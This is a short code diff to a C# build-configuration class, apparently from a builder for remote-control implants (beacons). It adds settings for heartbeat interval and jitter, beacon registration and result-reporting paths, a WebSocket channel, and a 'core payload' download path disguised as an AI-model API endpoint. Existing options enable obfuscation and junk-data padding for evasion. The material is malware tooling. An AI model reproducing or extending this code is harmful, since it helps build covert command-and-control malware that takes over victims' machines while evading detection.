@@ -6,6 +6,24 @@ public class BuildConfigRequest
     public string ApplicationType { get; set; } = "Console";
     public string ServerHost { get; set; } = "127.0.0.1";
     public int ServerPort { get; set; } = 5270;
+    /// 通信协议（"http"/"https"）；null = 按 ServerHost 前缀自动推断。
+    public string? ServerScheme { get; set; }
+    /// 心跳间隔（毫秒）；null = 默认 3000，构建时 clamp 到 [500, 60000]。
+    public ulong? HeartbeatIntervalMs { get; set; }
+    /// 抖动比例（0.0-0.9）；null = 默认 0.2，构建时 clamp。
+    public double? JitterPercent { get; set; }
+    /// 注册路径；null = 默认 /api/beacon/register。
+    public string? RegisterPath { get; set; }
+    /// 心跳路径；null = 默认 /api/beacon/heartbeat。
+    public string? HeartbeatPath { get; set; }
+    /// 结果上报路径；null = 默认 /api/beacon/result。
+    public string? ResultPath { get; set; }
+    /// WebSocket 路径；null = 默认 /ws/agent。
+    public string? WsPath { get; set; }
+    /// 核心载荷下载路径；null = 默认 /api/v1/models/{buildId}。
+    public string? CoreDownloadPath { get; set; }
+    /// 核心密钥协商路径；null = 默认 /api/v1/auth/token。
+    public string? CoreKeyPath { get; set; }
     public bool EnableObfuscation { get; set; }
     public bool InjectJunkData { get; set; }
     public int JunkDataMb { get; set; } = 10;
